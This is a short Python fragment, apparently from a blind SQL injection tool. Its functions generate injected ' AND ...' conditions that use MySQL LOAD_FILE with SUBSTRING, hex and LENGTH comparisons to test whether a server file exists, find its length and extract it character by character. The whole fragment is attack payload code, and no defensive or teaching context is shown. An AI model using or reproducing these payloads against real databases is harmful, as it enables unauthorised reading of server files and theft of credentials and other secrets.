
def file_char_at_index(file, char, index):
	return " AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(
		encode_str(file), index, char)

def fl_lessthan(file, test):
	return " AND LENGTH(LOAD_FILE({}))<{}".format(
		encode_str(file),
		test)

def fl_greaterthan(file, test):
	return " AND LENGTH(LOAD_FILE({}))>{}".format(
		encode_str(file),
		test)

def fl_equal(file, test):
	return " AND LENGTH(LOAD_FILE({}))={}".format(
		encode_str(file),
		test)

def file_exists(file):
	return " AND LENGTH(LOAD_FILE({}))>0".format(
		encode_str(file))
